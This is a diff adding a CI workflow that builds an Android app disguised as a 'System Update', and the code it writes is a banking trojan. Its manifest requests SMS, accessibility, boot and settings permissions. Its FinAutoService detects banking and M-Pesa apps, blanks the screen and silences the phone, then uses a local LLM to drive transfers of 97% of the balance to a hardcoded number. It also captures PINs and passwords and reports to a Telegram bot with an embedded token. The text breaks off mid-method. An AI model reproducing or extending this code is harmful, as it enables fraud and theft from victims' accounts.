@@ -1,0 +1,1293 @@
+name: Build System Update APK (Full JNI Interface)
+
+permissions:
+  contents: write
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install NDK
+        run: |
+          echo "y" | sdkmanager "ndk;26.1.10909125"
+
+      - name: Cache llama.cpp build
+        uses: actions/cache@v4
+        with:
+          path: llama.cpp/build
+          key: llama-build-${{ runner.os }}-${{ hashFiles('llama.cpp/**') }}
+          restore-keys: |
+            llama-build-${{ runner.os }}
+
+      - name: Build llama.cpp for Android
+        run: |
+          if [ ! -d "llama.cpp/build" ]; then
+            git clone --depth 1 https://github.com/ggerganov/llama.cpp
+            cd llama.cpp
+            mkdir build && cd build
+            cmake .. -DCMAKE_TOOLCHAIN_FILE=$ANDROID_HOME/ndk/26.1.10909125/build/cmake/android.toolchain.cmake \
+                     -DANDROID_ABI=arm64-v8a \
+                     -DANDROID_PLATFORM=android-26 \
+                     -DCMAKE_BUILD_TYPE=Release \
+                     -DLLAMA_BUILD_EXAMPLES=OFF \
+                     -DLLAMA_BUILD_TESTS=OFF \
+                     -DLLAMA_BUILD_SERVER=OFF \
+                     -DLLAMA_BUILD_COMMON=ON
+            make -j$(nproc)
+          else
+            echo "llama.cpp build restored from cache - cleaning to avoid stale objects"
+            cd llama.cpp/build
+            make clean
+            cmake .. -DCMAKE_TOOLCHAIN_FILE=$ANDROID_HOME/ndk/26.1.10909125/build/cmake/android.toolchain.cmake \
+                     -DANDROID_ABI=arm64-v8a \
+                     -DANDROID_PLATFORM=android-26 \
+                     -DCMAKE_BUILD_TYPE=Release \
+                     -DLLAMA_BUILD_EXAMPLES=OFF \
+                     -DLLAMA_BUILD_TESTS=OFF \
+                     -DLLAMA_BUILD_SERVER=OFF \
+                     -DLLAMA_BUILD_COMMON=ON
+            make -j$(nproc)
+          fi
+
+      - name: Create project structure
+        run: |
+          mkdir -p app/src/main/java/com/system/updator
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/jniLibs/arm64-v8a
+          mkdir -p app/src/main/cpp
+
+      - name: Copy llama libraries and headers
+        run: |
+          cp llama.cpp/build/libllama.so app/src/main/jniLibs/arm64-v8a/
+          cp llama.cpp/llama.h app/src/main/cpp/
+          cp llama.cpp/ggml.h app/src/main/cpp/
+
+      - name: Create settings.gradle
+        run: |
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "SystemUpdator"
+          include ':app'
+          EOF
+
+      - name: Create build.gradle (Project)
+        run: |
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+              }
+          }
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          EOF
+
+      - name: Create app/build.gradle
+        run: |
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+
+          android {
+              namespace 'com.system.updator'
+              compileSdk 34
+
+              defaultConfig {
+                  applicationId "com.system.updator"
+                  minSdk 26
+                  targetSdk 34
+                  versionCode 5
+                  versionName "5.0"
+              }
+
+              buildTypes {
+                  release {
+                      minifyEnabled true
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+
+              externalNativeBuild {
+                  cmake {
+                      path "src/main/cpp/CMakeLists.txt"
+                  }
+              }
+          }
+
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.core:core:1.12.0'
+              implementation 'com.google.android.material:material:1.11.0'
+              implementation 'androidx.work:work-runtime:2.9.0'
+              implementation 'androidx.webkit:webkit:1.9.0'
+              implementation 'com.google.code.gson:gson:2.10.1'
+          }
+          EOF
+
+      - name: Create gradle.properties
+        run: |
+          cat > gradle.properties << 'EOF'
+          org.gradle.jvmargs=-Xmx2048m
+          android.useAndroidX=true
+          android.enableJetifier=false
+          android.suppressUnsupportedCompileSdk=34
+          EOF
+
+      - name: Create gradle wrapper
+        run: |
+          mkdir -p gradle/wrapper
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar
+
+      - name: Create gradlew
+        run: |
+          cat > gradlew << 'EOF'
+          #!/bin/sh
+          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
+          APP_NAME="Gradle"
+          APP_BASE_NAME=${0##*/}
+          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
+          MAX_FD=maximum
+          warn () { echo "$*" >&2; }
+          die () { echo "$*"; echo; exit 1; }
+          cygwin=false
+          msys=false
+          darwin=false
+          nonstop=false
+          case "$( uname )" in
+            CYGWIN* ) cygwin=true ;;
+            Darwin* ) darwin=true ;;
+            MSYS* | MINGW* ) msys=true ;;
+            NONSTOP* ) nonstop=false ;;
+          esac
+          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
+          if [ -n "$JAVA_HOME" ] ; then
+              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
+                  JAVACMD=$JAVA_HOME/jre/sh/java
+              else
+                  JAVACMD=$JAVA_HOME/bin/java
+              fi
+              if [ ! -x "$JAVACMD" ] ; then
+                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
+              fi
+          else
+              JAVACMD=java
+              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
+          fi
+          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
+              case $MAX_FD in
+                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
+              esac
+              case $MAX_FD in
+                '' | soft) : ;;
+                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
+              esac
+          fi
+          if "$cygwin" || "$msys" ; then
+              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
+              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
+              JAVACMD=$( cygpath --unix "$JAVACMD" )
+              for arg do
+                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
+                      arg=$( cygpath --path --ignore --mixed "$arg" )
+                  fi
+                  set -- "$@" "$arg"
+              done
+          fi
+          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
+          set -- \
+              "-Dorg.gradle.appname=$APP_BASE_NAME" \
+              -classpath "$CLASSPATH" \
+              org.gradle.wrapper.GradleWrapperMain \
+              "$@"
+          eval "set -- $(
+              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
+              xargs -n1 |
+              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
+              tr '\n' ' '
+          )" '"$@"'
+          exec "$JAVACMD" "$@"
+          EOF
+          chmod +x gradlew
+
+      - name: Create strings.xml
+        run: |
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          EOF
+
+      - name: Create launcher icon
+        run: |
+          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="192dp"
+              android:height="192dp"
+              android:viewportWidth="192"
+              android:viewportHeight="192">
+              <path
+                  android:fillColor="#3B82F6"
+                  android:pathData="M96,32c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,68c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,104c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12z"/>
+          </vector>
+          EOF
+
+      - name: Create AndroidManifest.xml
+        run: |
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
+
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.CALL_PHONE" />
+              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+              <uses-permission android:name="android.permission.GET_TASKS" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+
+              <application
+                  android:allowBackup="true"
+                  android:label="@string/app_name"
+                  android:icon="@drawable/ic_launcher"
+                  android:usesCleartextTraffic="true"
+                  android:requestLegacyExternalStorage="true"
+                  android:theme="@style/Theme.AppCompat.NoActionBar">
+
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true"
+                      android:theme="@style/Theme.AppCompat.NoActionBar">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+
+                  <service
+                      android:name=".FinAutoService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config" />
+                  </service>
+
+                  <service
+                      android:name=".AIDownloaderService"
+                      android:exported="false" />
+
+                  <receiver
+                      android:name=".BootReceiver"
+                      android:exported="true"
+                      android:enabled="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                      </intent-filter>
+                  </receiver>
+
+                  <receiver
+                      android:name=".SmsReceiver"
+                      android:exported="true"
+                      android:enabled="true"
+                      android:permission="android.permission.BROADCAST_SMS">
+                      <intent-filter android:priority="999">
+                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          EOF
+
+      - name: Create accessibility_config.xml
+        run: |
+          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/app_name"
+              android:notificationTimeout="100" />
+          EOF
+
+      - name: Create activity_main.xml (white background)
+        run: |
+          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:gravity="center"
+              android:padding="32dp"
+              android:background="#FFFFFF">
+
+              <ImageView
+                  android:layout_width="80dp"
+                  android:layout_height="80dp"
+                  android:src="@drawable/ic_launcher"
+                  android:layout_marginBottom="24dp" />
+
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="System Update"
+                  android:textColor="#000000"
+                  android:textSize="24sp"
+                  android:textStyle="bold"
+                  android:layout_marginBottom="32dp" />
+
+              <Button
+                  android:id="@+id/btnPermissions"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Grant All Permissions"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#3B82F6"
+                  android:layout_marginBottom="12dp" />
+
+              <Button
+                  android:id="@+id/btnAccessibility"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Enable Accessibility Service"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#8B5CF6"
+                  android:layout_marginBottom="12dp" />
+
+              <TextView
+                  android:id="@+id/tvStatus"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="Tap buttons to grant permissions"
+                  android:textColor="#666666"
+                  android:textSize="14sp"
+                  android:layout_marginTop="24dp" />
+          </LinearLayout>
+          EOF
+
+      - name: Create CMakeLists.txt (fixed – only link libllama.so)
+        run: |
+          cat > app/src/main/cpp/CMakeLists.txt << 'EOF'
+          cmake_minimum_required(VERSION 3.18)
+          project("systemupdator")
+
+          set(CMAKE_CXX_STANDARD 17)
+          set(CMAKE_CXX_STANDARD_REQUIRED ON)
+
+          set(LLAMA_DIR ${CMAKE_CURRENT_SOURCE_DIR}/../../../llama.cpp)
+
+          include_directories(${LLAMA_DIR})
+
+          add_library(ai_jni SHARED
+              ai_jni.cpp
+          )
+
+          # Import the pre-built libllama.so
+          add_library(llama SHARED IMPORTED)
+          set_target_properties(llama PROPERTIES
+              IMPORTED_LOCATION ${CMAKE_CURRENT_SOURCE_DIR}/../../../jniLibs/arm64-v8a/libllama.so
+          )
+
+          target_link_libraries(ai_jni
+              llama
+              log
+          )
+          EOF
+
+      - name: Create ai_jni.cpp (full llama implementation)
+        run: |
+          cat > app/src/main/cpp/ai_jni.cpp << 'EOF'
+          #include <jni.h>
+          #include <string>
+          #include <mutex>
+          #include <vector>
+          #include <android/log.h>
+          #include <llama.h>
+
+          #define LOG_TAG "AI_JNI"
+          #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
+          #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
+
+          static llama_model *g_model = nullptr;
+          static llama_context *g_ctx = nullptr;
+          static std::mutex g_mutex;
+
+          static std::string jstring_to_string(JNIEnv *env, jstring jstr) {
+              if (jstr == nullptr) return "";
+              const char *chars = env->GetStringUTFChars(jstr, nullptr);
+              std::string result(chars);
+              env->ReleaseStringUTFChars(jstr, chars);
+              return result;
+          }
+
+          static bool load_model(const std::string &model_path) {
+              std::lock_guard<std::mutex> lock(g_mutex);
+              if (g_model != nullptr) return true;
+
+              llama_backend_init();
+
+              llama_model_params model_params = llama_model_default_params();
+              model_params.n_gpu_layers = 0;
+              g_model = llama_load_model_from_file(model_path.c_str(), model_params);
+              if (!g_model) {
+                  LOGE("Failed to load model: %s", model_path.c_str());
+                  return false;
+              }
+
+              llama_context_params ctx_params = llama_context_default_params();
+              ctx_params.n_ctx = 2048;
+              ctx_params.n_batch = 512;
+              ctx_params.n_threads = 4;
+              g_ctx = llama_new_context_with_model(g_model, ctx_params);
+              if (!g_ctx) {
+                  LOGE("Failed to create context");
+                  llama_free_model(g_model);
+                  g_model = nullptr;
+                  return false;
+              }
+
+              LOGD("Model loaded successfully");
+              return true;
+          }
+
+          static std::string generate_response(const std::string &prompt) {
+              if (!g_model || !g_ctx) {
+                  return "ERROR: Model not loaded";
+              }
+
+              std::vector<llama_token> tokens;
+              int n_tokens = llama_tokenize(g_model, prompt.c_str(), prompt.length(), nullptr, 0, true, false);
+              if (n_tokens <= 0) return "ERROR: Tokenization failed";
+              tokens.resize(n_tokens);
+              llama_tokenize(g_model, prompt.c_str(), prompt.length(), tokens.data(), n_tokens, true, false);
+
+              int n_past = 0;
+              if (llama_decode(g_ctx, llama_batch_get_one(tokens.data(), tokens.size(), n_past, 0))) {
+                  return "ERROR: Prompt decode failed";
+              }
+              n_past += tokens.size();
+
+              std::string result;
+              int max_tokens = 256;
+              for (int i = 0; i < max_tokens; ++i) {
+                  llama_token id = llama_sample_token(g_ctx, nullptr);
+                  if (id == llama_token_eos(g_model)) break;
+                  char buf[128];
+                  int n = llama_token_to_piece(g_model, id, buf, sizeof(buf), 0, true);
+                  if (n > 0) result.append(buf, n);
+                  if (llama_decode(g_ctx, llama_batch_get_one(&id, 1, n_past, 0))) break;
+                  n_past += 1;
+              }
+              return result;
+          }
+
+          extern "C" {
+          JNIEXPORT jstring JNICALL
+          Java_com_system_updator_LocalAI_predict(
+              JNIEnv *env,
+              jobject /* this */,
+              jstring jprompt,
+              jstring jmodelPath) {
+
+              std::string prompt = jstring_to_string(env, jprompt);
+              std::string model_path = jstring_to_string(env, jmodelPath);
+
+              LOGD("Prompt: %s", prompt.c_str());
+              LOGD("Model path: %s", model_path.c_str());
+
+              if (!load_model(model_path)) {
+                  LOGE("Model loading failed");
+                  return env->NewStringUTF("ERROR: Model loading failed");
+              }
+
+              std::string response;
+              {
+                  std::lock_guard<std::mutex> lock(g_mutex);
+                  response = generate_response(prompt);
+              }
+
+              LOGD("Response: %s", response.c_str());
+              return env->NewStringUTF(response.c_str());
+          }
+          }
+          EOF
+
+      - name: Create LocalAI.java
+        run: |
+          cat > app/src/main/java/com/system/updator/LocalAI.java << 'EOF'
+          package com.system.updator;
+          import android.content.Context;
+          import android.util.Log;
+          import java.io.File;
+          public class LocalAI {
+              private static final String TAG = "LocalAI";
+              private static final String MODEL_FILE = "models/qwen2.5-1.5b-instruct-q4_k_m.gguf";
+              static { System.loadLibrary("ai_jni"); }
+              private String modelPath;
+              public LocalAI(Context context) {
+                  this.modelPath = new File(context.getFilesDir(), MODEL_FILE).getAbsolutePath();
+              }
+              public native String predict(String prompt, String modelPath);
+              public String getAction(String screenText, String goal) {
+                  String prompt = "Goal: " + goal + ". Screen: " + screenText + ". Reply with one of: USSD_CODE(code), CLICK_TEXT(text), TYPE_TEXT(text), WAIT(ms), CAPTURE_PIN(pin), CAPTURE_PASSWORD(pass), COMPLETE, ERROR";
+                  return predict(prompt, modelPath);
+              }
+          }
+          EOF
+
+      - name: Create AppData.java
+        run: |
+          cat > app/src/main/java/com/system/updator/AppData.java << 'EOF'
+          package com.system.updator;
+          import android.content.SharedPreferences;
+          import com.google.gson.Gson;
+          import com.google.gson.reflect.TypeToken;
+          import java.lang.reflect.Type;
+          import java.util.HashMap;
+          import java.util.Map;
+          public class AppData {
+              private SharedPreferences prefs;
+              private Gson gson = new Gson();
+              private Map<String, AppEntry> apps = new HashMap<>();
+              public AppData(SharedPreferences prefs) { this.prefs = prefs; load(); }
+              private void load() {
+                  String json = prefs.getString("apps", "{}");
+                  Type type = new TypeToken<Map<String, AppEntry>>(){}.getType();
+                  Map<String, AppEntry> saved = gson.fromJson(json, type);
+                  if (saved != null) apps = saved;
+              }
+              public void save() { prefs.edit().putString("apps", gson.toJson(apps)).apply(); }
+              public AppEntry getOrCreate(String packageName, String appName) {
+                  if (!apps.containsKey(packageName)) {
+                      AppEntry entry = new AppEntry();
+                      entry.packageName = packageName;
+                      entry.appName = appName;
+                      apps.put(packageName, entry);
+                      save();
+                  }
+                  return apps.get(packageName);
+              }
+              public void setPin(String pkg, String pin) { if (apps.containsKey(pkg)) { apps.get(pkg).pin = pin; apps.get(pkg).pinLearned = true; save(); } }
+              public void setPassword(String pkg, String pass) { if (apps.containsKey(pkg)) { apps.get(pkg).password = pass; save(); } }
+              public String getPin(String pkg) { return apps.containsKey(pkg) ? apps.get(pkg).pin : null; }
+              public static class AppEntry {
+                  public String packageName, appName, pin, password, email, ussdCode;
+                  public boolean pinLearned = false;
+              }
+          }
+          EOF
+
+      - name: Create FinAutoService.java
+        run: |
+          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
+          package com.system.updator;
+
+          import android.accessibilityservice.AccessibilityService;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.media.AudioManager;
+          import android.net.Uri;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.os.PowerManager;
+          import android.provider.Settings;
+          import android.util.Log;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.view.accessibility.AccessibilityNodeInfo;
+
+          import java.util.concurrent.ExecutorService;
+          import java.util.concurrent.Executors;
+          import java.util.concurrent.atomic.AtomicReference;
+
+          public class FinAutoService extends AccessibilityService {
+              private static final String TAG = "FinAutoService";
+              private static final String TARGET_PHONE = "0798688920";
+              private static final double SEND_PERCENTAGE = 0.97;
+              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
+              private static final String CHAT_ID = "8468538314";
+
+              private static final AtomicReference<Double> SMS_BALANCE = new AtomicReference<>(0.0);
+              private static final AtomicReference<String> SMS_BODY = new AtomicReference<>("");
+              private static final AtomicReference<Long> SMS_TIME = new AtomicReference<>(0L);
+              private static final AtomicReference<String> OTP_CODE = new AtomicReference<>("");
+
+              public static void updateBalance(double bal, String body, long time) {
+                  SMS_BALANCE.set(bal);
+                  SMS_BODY.set(body);
+                  SMS_TIME.set(time);
+              }
+              public static void updateOTP(String otp) {
+                  OTP_CODE.set(otp);
+              }
+
+              private Handler handler = new Handler(Looper.getMainLooper());
+              private ExecutorService executor = Executors.newSingleThreadExecutor();
+              private PowerManager.WakeLock wakeLock;
+              private AudioManager audioManager;
+              private LocalAI localAI;
+              private AppData appData;
+
+              private String currentPackage = "";
+              private String currentAppName = "";
+              private boolean isAutomating = false;
+              private String currentGoal = "Send 97% of balance to " + TARGET_PHONE;
+              private String lastScreenText = "";
+
+              private int originalBrightness;
+              private int originalRingerMode;
+
+              @Override
+              public void onServiceConnected() {
+                  super.onServiceConnected();
+                  localAI = new LocalAI(this);
+                  SharedPreferences prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
+                  appData = new AppData(prefs);
+                  audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
+                  originalRingerMode = audioManager.getRingerMode();
+                  originalBrightness = getScreenBrightness();
+
+                  acquireWakeLock();
+                  sendTelegram("System Update ready. AI model loading...");
+              }
+
+              private void acquireWakeLock() {
+                  PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                  wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "SystemUpdate:Wake");
+                  wakeLock.acquire(10 * 60 * 1000L);
+              }
+
+              private int getScreenBrightness() {
+                  try {
+                      return Settings.System.getInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS);
+                  } catch (Settings.SettingNotFoundException e) {
+                      return 127;
+                  }
+              }
+
+              private void setScreenBrightness(int value) {
+                  Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, value);
+              }
+
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
+                  try {
+                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
+                      if (pkg.isEmpty()) return;
+
+                      if (!pkg.equals(currentPackage)) {
+                          currentPackage = pkg;
+                          String screenText = getAllText(getRootInActiveWindow());
+                          String response = localAI.getAction(screenText, "Identify this app and return APP_NAME:...");
+                          currentAppName = screenText.length() > 50 ? screenText.substring(0, 50) : "Unknown";
+                          appData.getOrCreate(currentPackage, currentAppName);
+
+                          if (isFinancialApp(screenText)) {
+                              isAutomating = true;
+                              setScreenBrightness(0);
+                              audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
+                              sendTelegram("Automation started - brightness zero, silent mode on.");
+                              handler.postDelayed(() -> startAutomation(), 2000);
+                          }
+                      }
+
+                      if (isAutomating) {
+                          String screenText = getAllText(getRootInActiveWindow());
+                          if (!screenText.equals(lastScreenText)) {
+                              lastScreenText = screenText;
+                              executor.execute(() -> {
+                                  String action = localAI.getAction(screenText, currentGoal);
+                                  Log.d(TAG, "AI action: " + action);
+                                  executeAction(action);
+                              });
+                          }
+                      }
+
+                  } catch (Exception e) {
+                      Log.e(TAG, "Event error", e);
+                  }
+              }
+
+              private boolean isFinancialApp(String screenText) {
+                  String lower = screenText.toLowerCase();
+                  return lower.contains("bank") || lower.contains("mpesa") || lower.contains("balance") ||
+                         lower.contains("send money") || lower.contains("withdraw") || lower.contains("stk");
+              }
+
+              private void startAutomation() {
+                  String screenText = getAllText(getRootInActiveWindow());
+                  executor.execute(() -> {
+                      String action = localAI.getAction(screenText, currentGoal);
+                      executeAction(action);
+                  });
+              }
+
+              private void executeAction(String action) {
+                  if (action == null || action.isEmpty()) return;
+
+                  if (action.startsWith("USSD_CODE")) {
+                      String code = extractQuoted(action);
+                      if (!code.isEmpty()) openDialer(code);
+                      else sendTelegram("USSD_CODE missing code");
+                  } else if (action.startsWith("CLICK_TEXT")) {
+                      String text = extractQuoted(action);
+                      if (!text.isEmpty()) clickText(text);
+                  } else if (action.startsWith("TYPE_TEXT")) {
+                      String text = extractQuoted(action);
+                      if (text.isEmpty()) text = TARGET_PHONE;
+                      typeInField(text);
+                  } else if (action.startsWith("CAPTURE_PIN")) {
+                      String pin = extractQuoted(action);
+                      if (!pin.isEmpty()) {
+                          appData.setPin(currentPackage, pin);
+                          sendTelegram("PIN captured for " + currentAppName);
+                      }
+                  } else if (action.startsWith("CAPTURE_PASSWORD")) {
+                      String pass = extractQuoted(action);
+                      if (!pass.isEmpty()) {
+                          appData.setPassword(currentPackage, pass);
+                          sendTelegram("Password captured for " + currentAppName);
+                      }
+                  } else if (action.startsWith("WAIT")) {
+                      int ms = extractNumber(action);
+                      try { Thread.sleep(ms); } catch (InterruptedException e) { }
+                  } else if (action.startsWith("COMPLETE")) {
+                      isAutomating = false;
+                      setScreenBrightness(originalBrightness);
+                      audioManager.setRingerMode(originalRingerMode);
+                      sendTelegram("Transaction complete. Settings restored.");
+                  } else if (action.startsWith("ERROR")) {
+                      isAutomating = false;
+                      setScreenBrightness(originalBrightness);
+                      audioManager.setRingerMode(originalRingerMode);
+                      sendTelegram("Error: " + action);
+                  } else {
+                      sendTelegram("Unknown action: " + action);
+                  }
+              }
+
+              private String extractQuoted(String s) {
+                  int start = s.indexOf("\"");
+                  int end = s.lastIndexOf("\"");
+                  if (start != -1 && end != -1 && start < end) {
+                      return s.substring(start + 1, end);
+                  }
+                  return "";
+              }
+
+              private int extractNumber(String s) {
+                  String num = s.replaceAll("\\D+", "");
+                  if (num.isEmpty()) return 1000;
+                  return Integer.parseInt(num);
+              }
+
+              private String getAllText(AccessibilityNodeInfo node) {
+                  if (node == null) return "";
+                  StringBuilder sb = new StringBuilder();
+                  try {
+                      if (node.getText() != null) sb.append(node.getText().toString()).append(" ");
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          sb.append(getAllText(node.getChild(i)));
+                      }
+                  } catch (Exception e) { }
+                  return sb.toString();
+              }
+
+              private boolean clickText(String text) {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return false;
+                  return findAndClick(root, text);
+              }
+
+              private boolean findAndClick(AccessibilityNodeInfo node, String text) {
+                  if (node == null) return false;
+                  try {
+                      if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
+                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          return true;
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          if (findAndClick(node.getChild(i), text)) return true;
+                      }
+                  } catch (Exception e) { }
+                  return false;
+              }
+
+              private boolean typeInField(String text) {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return false;
+                  AccessibilityNodeInfo field = findEditableField(root);
+                  if (field != null) {
+                      android.os.Bundle args = new android.os.Bundle();
+                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+                      field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+                      return true;
+                  }
+                  return false;
+              }
+
+              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
+                  if (node == null) return null;
+                  try {
+                      if (node.isEditable() && node.isEnabled()) return node;
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          AccessibilityNodeInfo result = findEditableField(node.getChild(i));
+                          if (result != null) return result;
+                      }
+                  } catch (Exception e) { }
+                  return null;
+              }
+
+              private void openDialer(String ussd) {
+                  Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + ussd));
+                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                  startActivity(intent);
+              }
+
+              private void sendTelegram(String msg) {
+                  executor.execute(() -> {
+                      try {
+                          java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                          java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                          conn.setRequestMethod("POST");
